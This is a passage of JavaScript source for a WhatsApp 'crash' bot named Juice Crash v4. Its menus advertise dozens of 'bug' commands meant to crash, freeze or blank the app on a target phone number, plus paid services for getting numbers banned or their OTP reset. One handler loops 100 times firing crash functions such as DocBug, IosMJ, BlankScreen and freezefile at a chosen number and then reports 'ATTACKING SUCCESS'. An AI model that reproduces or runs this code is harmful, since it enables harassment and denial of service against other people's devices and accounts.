\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
m.reply("done clear chat by King Juice😖")
AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy-meow.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break;

case "menu": {
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `
> Hello ✨ ${pushname} I am an *Juice Crash v4* bot designed to help you

Don't forget to enter our channel, so you don't miss the latest version of the *Juice Crash* script update info 

*\`⪻ Channel Developer ⪼\`*
https://whatsapp.com/channel/0029Vb1ns4CKQuJCFJN1gJ3T

to display the menu you can type *juice* or *crash*

*≪ 𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐 : 𝑲𝒊𝒏𝒈 𝑱𝒖𝒊𝒄𝒆 ≫*
*≪ 𝑺𝒖𝒑𝒑𝒐𝒓𝒕𝒊𝒏𝒈 𝑪𝒓𝒂𝒛𝒚 𝑫𝒆𝒗 & 𝑫𝒆𝒗 𝑹𝒊𝒎𝒌𝒖𝒔 ≫*
 `
AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy-meow.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case "juice":
case "crash": {
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `
*\`[ ⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄ ]\`*
🎉 𝐔𝐬𝐞𝐫 : *${pushname}*
🎉 𝐁𝐨𝐭-𝐍𝐚𝐦𝐞 : 𝐉𝐮𝐢𝐜𝐞 𝐂𝐫𝐚𝐬𝐡
🎉 𝐕𝐞𝐫𝐬𝐢 : 4.0.0
🎉 𝐃𝐞𝐯 : 𝐊𝐢𝐧𝐠 𝐉𝐮𝐢𝐜𝐞
🎉 𝐌𝐨𝐝𝐞 : *${AndraZyy.public ? "public": "self"}*

*\`⪻ Channel Developer ⪼\`*
https://whatsapp.com/channel/0029Vb1ns4CKQuJCFJN1gJ3T

*\`✰ 𝐊𝐢𝐧𝐠 ↯ 𝐉𝐮𝐢𝐜𝐞 ✰\`*
⪩ /crash-menu ⪨

 *\`✰ 𝐁𝐮𝐠 ↯ 𝐌𝐞𝐧𝐮 ✰\`*
 *• 𝐋𝐨𝐯𝐞-𝐘𝐨𝐮 1849𝐱𝐱𝐱𝐱*
 *• 𝐁𝐚𝐢𝐬𝐞 1849𝐱𝐱𝐱𝐱*
 *• 𝐃𝐢𝐞 1849𝐱𝐱𝐱𝐱*
 *• 𝐈𝐩𝐡𝐨𝐧𝐞 1849𝐱𝐱𝐱𝐱*
 *• 𝐱𝐢𝐨𝐬 1849𝐱𝐱𝐱𝐱*
 *• 𝐃𝐚𝐫𝐤-𝐚𝐧𝐠𝐞𝐥 1849𝐱𝐱𝐱𝐱*
 *• 𝐊𝐢𝐜𝐤-𝐝𝐯𝐜 1849𝐱𝐱𝐱𝐱*
 *• 𝐉𝐮𝐢𝐜𝐞-𝐬𝐲𝐬𝐭𝐞𝐦 1849𝐱𝐱𝐱𝐱*
 *• 𝐱𝐢𝐦𝐮𝐧𝐞 1849𝐱𝐱𝐱𝐱*
 *• 𝐂𝐫𝐚𝐬𝐡-𝐮𝐢 1849𝐱𝐱𝐱𝐱*
 *• 𝐱-𝐛𝐮𝐠 1849𝐱𝐱𝐱𝐱*
 *• 𝐑𝐢𝐦𝐤𝐮𝐬-𝐨𝐟𝐟 1849𝐱𝐱𝐱𝐱*
 *• 𝐉𝐮𝐢𝐜𝐞-𝐜𝐫𝐚𝐬𝐡 1849𝐱𝐱𝐱𝐱*
 *• 𝐃𝐚𝐫𝐤 1849𝐱𝐱𝐱𝐱*
 *• 𝐂𝐫𝐚𝐬𝐡-𝐟𝐜 1849𝐱𝐱𝐱𝐱*
 *• 𝐅𝐨𝐫𝐜𝐞-𝐜𝐥𝐨𝐬𝐞 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗘𝗺𝗼𝗷𝗶 ✰\`* 
 *⚡ 1849𝐱𝐱𝐱𝐱*
 *💫 1849𝐱𝐱𝐱𝐱*
 *🔥 1849𝐱𝐱𝐱𝐱*
 *😈 1849𝐱𝐱𝐱𝐱*
 *💀 1849𝐱𝐱𝐱𝐱*
 *☠️ 1849𝐱𝐱𝐱𝐱*
 *⭐ 1849𝐱𝐱𝐱𝐱*
 *💦 1849𝐱𝐱𝐱𝐱*
 *🍆 1849𝐱𝐱𝐱𝐱*
 *🌹 1849𝐱𝐱𝐱𝐱*
 *🐉 1849𝐱𝐱𝐱𝐱*
 *💧 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗛𝗮𝗿𝗱 𝘂𝗶 ↯ 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 ✰\`*
 *bugui-unliv1 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv2 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv3 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv4 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv5 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv6 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv7 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv8 1849𝐱𝐱𝐱𝐱*
 *bugui-unliv8 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗩𝗶𝗿𝘁𝗲𝘅 ↯ 𝗕𝗹𝗮𝗻𝗸 ✰\`* 
 *virtexv1 1849𝐱𝐱𝐱𝐱*
 *virtexv2 1849𝐱𝐱𝐱𝐱*
 *virtexv3 1849𝐱𝐱𝐱𝐱*
 *virtexv4 1849𝐱𝐱𝐱𝐱*
 *virtexv5 1849𝐱𝐱𝐱𝐱*
 *virtexv6 1849𝐱𝐱𝐱𝐱*
 *virtexv7 1849𝐱𝐱𝐱𝐱*
 *virtexv8 1849𝐱𝐱𝐱𝐱*
 *virtexv9 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗣𝗮𝗸𝘁𝘇𝘆 ✰\`* 
 *paktzy1 1849𝐱𝐱𝐱𝐱*
 *paktzy2 1849𝐱𝐱𝐱𝐱*
 *paktzy3 1849𝐱𝐱𝐱𝐱*
 *paktzy4 1849𝐱𝐱𝐱𝐱*
 *paktzy5 1849𝐱𝐱𝐱𝐱*
 *paktzy6 1849𝐱𝐱𝐱𝐱*
 *paktzy7 1849𝐱𝐱𝐱𝐱*
 *paktzy8 1849𝐱𝐱𝐱𝐱*
 *paktzy9 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗖𝗿𝗮𝘀𝗵 𝗟𝗼𝗰 ✰\`* 
 *trash-locv1 1849𝐱𝐱𝐱𝐱*
 *trash-locv2 1849𝐱𝐱𝐱𝐱*
 *trash-locv3 1849𝐱𝐱𝐱𝐱*
 *trash-locv4 1849𝐱𝐱𝐱𝐱*
 *trash-locv5 1849𝐱𝐱𝐱𝐱*
 *trash-locv6 1849𝐱𝐱𝐱𝐱*
 *trash-locv7 1849𝐱𝐱𝐱𝐱*
 *trash-locv8 1849𝐱𝐱𝐱𝐱*
 *trash-locv9 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗡𝗲𝘄 𝗙𝗶𝘅 ✰\`* 
 *fc-bugfix1 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix2 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix3 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix4 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix5 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix6 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix7 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix8 1849𝐱𝐱𝐱𝐱*
 *fc-bugfix9 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗖𝗼𝗺𝗯𝗼 ✰\`* 
 *• 1𝐡𝐢𝐭 1849𝐱𝐱𝐱𝐱*
 *• 𝐱 1849𝐱𝐱𝐱𝐱*
 *• 𝐃𝐞𝐚𝐭𝐡 1849𝐱𝐱𝐱𝐱*
 *• 𝐁𝐨𝐨𝐦 1849𝐱𝐱𝐱𝐱*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗝𝘂𝗶𝗰𝗲 ✰\`* 
 *𝖩𝗎𝗂𝖼𝖾-v1 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v2 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v3 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v4 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v5 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v6 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v7 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v8 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-v9 1849𝗑𝗑𝗑𝗑*
 *𝖩𝗎𝗂𝖼𝖾-𝗏10 1849𝗑𝗑𝗑𝗑*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗡𝗲𝘄 𝗙𝗜𝗫 ✰\`* 
 *𝖩𝗎𝗂𝖼𝖾1 1849xxxx*
 *𝖱𝗂𝗆𝗄𝗎𝗌2 1849xxxx*
 *Crazy3 1849xxxx*
 *fix-bug 1849xxxx*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗗𝗶𝗲 ✰\`*
 *Die-v1 1849xxxx*
 *Die-v2 1849xxxx*
 *Die-v3 1849xxxx*
 *Die-v4 1849xxxx*
 *Die-v5 1849xxxx*
 *Die-v6 1849xxxx*
 *Die-v7 1849xxxx*
 *Die-v8 1849xxxx*
 *Die-v9 1849xxxx*

 *\`✰ 𝗕𝗮𝗻𝗻𝗲𝗱 ↯ 𝗠𝗲𝗻𝘂 ✰\`* 
⪩ /banned-spam 1849xxxx
⪩ /banned-perma 1849xxxx
⪩ /bandperma-hard 1849xxxx
⪩ /bandperma-batu 1849xxxx
≪ /banned-menu ≫

 *\`✰ 𝗨𝗻𝗱𝗯𝗮𝗻𝗻𝗲𝗱 ↯ 𝗠𝗲𝗻𝘂 ✰\`* 
⪩ /undband-spam ↯ 1849xxxx
⪩ /undband-perma 1849xxxx
⪩ /undperma-hard 1849xxxx
⪩ /undperma-batu 1849xxxxx
⪩ /riset-otp ↯ 1849xxxx
≪ /banned-menu ≫

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗩𝗜𝗣 ✰\`* 
↯ /Xvip-kematian

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗚𝗿𝗼𝘂𝗽 ✰\`* 
 *Dead-gc*
 *Crash-group*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗜𝗻𝗳𝗶𝗻𝗶𝘁𝘆 ✰\`* 
⪩ /infinity 1849xxxx
⪩ /infinity-v1 1849xxxx
⪩ /infinity-v2 1849xxxx
⪩ /infinity-v3 1849xxxx
⪩ /infinity-v4 1849xxxx
⪩ /infinity-v5 1849xxxx
⪩ /infinity-v6 1849xxxx
⪩ /infinity-v7 1849xxxx
⪩ /infinity-v8 1849xxxx
⪩ /infinity-v9 1849xxxx

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗔𝗶𝗴𝗹𝗲 ✰\`* 
 *Aigle-v1 1849xxxx*
 *Aigle-v2 1849xxxx*
 *Aigle-v3 1849xxxx*
 *Aigle-v4 1849xxxx*
 *Aigle-v5 1849xxxx*
 *Aigle-v6 1849xxxx*
 *Aigle-v7 1849xxxx*
 *Aigle-v8 1849xxxx*
 *Aigle-v9 1849xxxx*

 *\`✰ 𝗕𝘂𝗴 ↯ 𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 ✰\`* 
 *unlimited-v1 1849xxxx*
 *unlimited-v2 1849xxxx*
 *unlimited-v3 1849xxxx*
 *unlimited-v4 1849xxxx*
 *unlimited-v5 1849xxxx*
 *unlimited-v6 1849xxxx*
 *unlimited-v7 1849xxxx*
 *unlimited-v8 1849xxxx*
 *unlimited-v9 1849xxxx*

 *\`✰ 𝗢𝘄𝗻𝗲𝗿 ↯ 𝗠𝗲𝗻𝘂 ✰\`* 
↯ /addprem 1849xxxx
↯ /delprem 1849xxxx
↯ /addowner 1849xxxx
↯ /delowner 1849xxxx

*\`⪻ Channel Developer ⪼\`*
https://whatsapp.com/channel/0029Vb1ns4CKQuJCFJN1gJ3T

*≪ 𝑻𝒉𝒂𝒏𝒌𝒔 𝑻𝒐 : 𝑲𝒊𝒏𝒈 𝑱𝒖𝒊𝒄𝒆 ≫*
*≪ 𝑺𝒖𝒑𝒑𝒐𝒓𝒕𝒊𝒏𝒈 𝑪𝒓𝒂𝒛𝒚 𝑫𝒆𝒗 & 𝑫𝒆𝒗 𝑹𝒊𝒎𝒌𝒖𝒔≫*

❏ ʚ||ɞ 𝗼𝘄𝗻 𝘀𝗰𝗿𝗶𝗽𝘁 ʚ||ɞ ❏
➢ ʚ||ɞ 𝗞𝗶𝗻𝗴 𝗝𝘂𝗶𝗰𝗲 𖥂
➢ ʚ||ɞ 𝗗𝗲𝘃 𝗥𝗶𝗺𝗸𝘂𝘀 𖥂
➢ ʚ||ɞ 𝗖𝗿𝗮𝘇𝘆 𝗗𝗲𝘃 𖥂

 `
AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy-meow.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break
case "banned-menu": {  // 𝙘𝙞𝙘𝙞𝙩𝙯𝙮 𝙜𝙖𝙗𝙪𝙩
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `
*\`[ ⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄ ]\`*
🎉 𝐔𝐬𝐞𝐫 : *${pushname}*
🎉 𝐁𝐨𝐭-𝐍𝐚𝐦𝐞 : 𝐉𝐮𝐢𝐜𝐞 𝐂𝐫𝐚𝐬𝐡 
🎉 𝐕𝐞𝐫𝐬𝐢 : 4.0.0
🎉 𝐃𝐞𝐯 : 𝐊𝐢𝐧𝐠 𝐉𝐮𝐢𝐜𝐞
🎉 𝐌𝐨𝐝𝐞 : *${AndraZyy.public ? "public": "self"}*

*\`✰ 𝗕𝗮𝗻𝗻𝗲𝗱 ↯ 𝗠𝗲𝗻𝘂 ✰\`*
⪩ banned-spam ↯ 𝗻𝘂𝗺𝗯𝗲𝗿
⪩ banned-perma ↯ 𝗻𝘂𝗺𝗯𝗲𝗿
⪩ bandperma-hard ↯ 𝗻𝘂𝗺𝗯𝗲𝗿
⪩ bandperma-batu ↯ 𝗻𝘂𝗺𝗯𝗲𝗿

*\`✰ 𝗨𝗻𝗱𝗯𝗮𝗻𝗻𝗲𝗱 ↯ 𝗠𝗲𝗻𝘂 ✰\`*
⪩ undband-spam ↯ 𝗻𝘂𝗺𝗯𝗲𝗿
⪩ undband-perma ↯ 𝗻𝘂𝗺𝗯𝗲𝗿
⪩ undperma-hard ↯ 𝗻𝘂𝗺𝗯𝗲𝗿
⪩ undperma-batu ↯ 𝗻𝘂𝗺𝗯𝗲𝗿
⪩ riset-otp ↯ 𝗻𝘂𝗺𝗯𝗲𝗿

*≪ 𝗝𝘂𝗶𝗰𝗲 𝗖𝗿𝗮𝘀𝗵 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗝𝘂𝗶𝗰𝗲 ≫*
 `
AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy-meow.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

 //✰ 𝗕𝗮𝗻𝗻𝗲𝗱 ↯ 𝗠𝗲𝗻𝘂 ✰
case "banned-spam": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆 𝘄𝗮𝗻𝗴𝘀𝗮𝗳𝗳
case "banned-perma": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆 𝘄𝗮𝗻𝗴𝘀𝗮𝗳𝗳
case "bandperma-hard": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆
case "bandperma-batu": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆
 //✰ 𝗨𝗻𝗱𝗯𝗮𝗻𝗻𝗲𝗱 ↯ 𝗠𝗲𝗻𝘂 
case "undband-spam": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆
case "undband-perma": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆
case "undperma-hard": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆
case "undperma-batu": //↯ 𝗰𝗶𝗰𝗶𝘁𝘇𝘆
case "riset-otp": {  // 𝙘𝙞𝙘𝙞𝙩𝙯𝙮 𝙜𝙖𝙗𝙪𝙩
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `
*𝗢𝗽𝗲𝗻 𝗣𝗮𝘁𝗻𝗲𝗿 𝗕𝗮𝗻𝗻𝗲𝗱 𝟭𝟬𝟬% 𝗩𝗜𝗣*
𝗣𝘁 𝗕𝗮𝗻𝗻𝗲𝗱 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗝𝘂𝗶𝗰𝗲

𝗽𝗮𝘁𝗻𝗲𝗿 : 𝟯𝟱𝗸
𝗼𝘄𝗻 : 𝟰𝟱𝗸

*𝗕𝗶𝘀𝗮 𝗡𝗲𝗴𝗼 ⚡*

*🔥 𝗠𝘂𝗿𝗯𝗮𝗻 𝗳𝗿𝗲𝗲 𝟭𝟬𝟬% 𝗩𝗜𝗣 🔥*
𝗞𝗶𝗻𝗴 𝗝𝘂𝗶𝗰𝗲
𝗖𝗿𝗮𝘇𝘆 𝗗𝗲𝘃
𝗗𝗲𝘃 𝗥𝗶𝗺𝗸𝘂𝘀

*⪻ 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 ⪼*
https://whatsapp.com/channel/0029Vb1ns4CKQuJCFJN1gJ3T
 `
AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy-meow.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case "juice-menu": {  // 𝙘𝙞𝙘𝙞𝙩𝙯𝙮 𝙜𝙖𝙗𝙪𝙩
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `
*\`[ ⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄ ]\`*
🎉 𝐔𝐬𝐞𝐫 : *${pushname}*
🎉 𝐁𝐨𝐭-𝐍𝐚𝐦𝐞 : 𝐉𝐮𝐢𝐜𝐞 𝐂𝐫𝐚𝐬𝐡
🎉 𝐕𝐞𝐫𝐬𝐢 : 4.0.0
🎉 𝐃𝐞𝐯 : 𝐊𝐢𝐧𝐠 𝐉𝐮𝐢𝐜𝐞
🎉 𝐌𝐨𝐝𝐞 : *${AndraZyy.public ? "public": "self"}*

*\`ᥫ᭡ 𝐊𝐢𝐧𝐠 𝐉𝐮𝐢𝐜𝐞 ᥫ᭡\`*
♡ love-you *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
♡ baise *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
♡ sexe *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
♡ kiss *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
♡ girlyyy *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
♡ sexy-girl *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
♡ 𝗖𝗶𝗻𝘁𝗮 𝗪𝗮𝗷𝗶𝗯 𝗗𝗶 𝗞𝗮𝘁𝗮𝗸𝗮𝗻 ♡

*≪ 𝗝𝘂𝗶𝗰𝗲 𝗖𝗿𝗮𝘀𝗵 𝗕𝘆 𝗞𝗶𝗻𝗴 𝗝𝘂𝗶𝗰𝗲 ≫*
 `
AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy-meow.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case "xvip-kematian": {
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `
*\`[ ⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄ ]\`*
🎉 𝐔𝐬𝐞𝐫 : *${pushname}*
🎉 𝐁𝐨𝐭-𝐍𝐚𝐦𝐞 : 𝐉𝐮𝐢𝐜𝐞 𝐂𝐫𝐚𝐬𝐡
🎉 𝐕𝐞𝐫𝐬𝐢 : 4.0.0
🎉 𝐃𝐞𝐯 : 𝐊𝐢𝐧𝐠 𝐉𝐮𝐢𝐜𝐞
🎉 𝐌𝐨𝐝𝐞 : *${AndraZyy.public ? "public": "self"}*

*\`✰ 𝗕𝘂𝗴 ↯ 𝗩𝗜𝗣 𝘃𝟭 ✰\`*
➢ /JuiceVip-v1 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v2 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v3 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v4 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v5 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v6 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v7 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v8 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /JuiceVip-v9 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*

*\`✰ 𝗕𝘂𝗴 ↯ 𝗩𝗜𝗣 𝘃𝟮 ✰\`*
➢ /CrashVip-v1 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVip-v2 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVip-v3 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVip-v5 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVip-v6 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVip-v7 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVip-v8 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVip-v9 *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
➢ /CrashVIP *⪻ 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*

*ᖫ 𝐉𝐮𝐢𝐜𝐞 𝐅𝐚𝐧'𝐬 ᖭ*
➢ 𝐊𝐢𝐧𝐠 𝐉𝐮𝐢𝐜𝐞 ❆
➢ 𝐃𝐞𝐯 𝐂𝐫𝐚𝐳𝐲 ❆
➢ 𝐃𝐞𝐯 𝐑𝐢𝐦𝐤𝐮𝐬 ❆
 `
AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./Andrazyy-meow.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
}
break

case '⚡': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '💫': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '🔥': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '😈': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '💀': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '☠': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '⭐': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '💦': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '🍆': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '🌹': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '🐉': // *⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
case '💧': //*⪻ 𝗔𝗻𝗱𝗿𝗮𝘇𝘆𝘆 𝗻𝘂𝗺𝗯𝗲𝗿 ⪼*
if (!isPremium) return reply(" Khusus Owner *Juice Crash* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 100; i++) {
await DocBug(target);
await LocaBugs(target);
await DocBug(target);
await LocaBugs(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
await DocBug(target);
await LocaBugs(target);
await IosMJ(target, Ptcp = true);
await crashbeta(target, ptcp = true);
await crashui2(target, { ptcp: true });
await BlankScreen(target, { ptcp: true });
await XeonXRobust(target, { ptcp: true });
await freezefile(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case 'crashvip-v1': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip-v2': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip-v3': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip-v4': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
case 'crashvip-v5': // 𝙗𝙪𝙜 𝙘𝙞𝙘𝙞 𝙘𝙖𝙣𝙩𝙞𝙠 😖
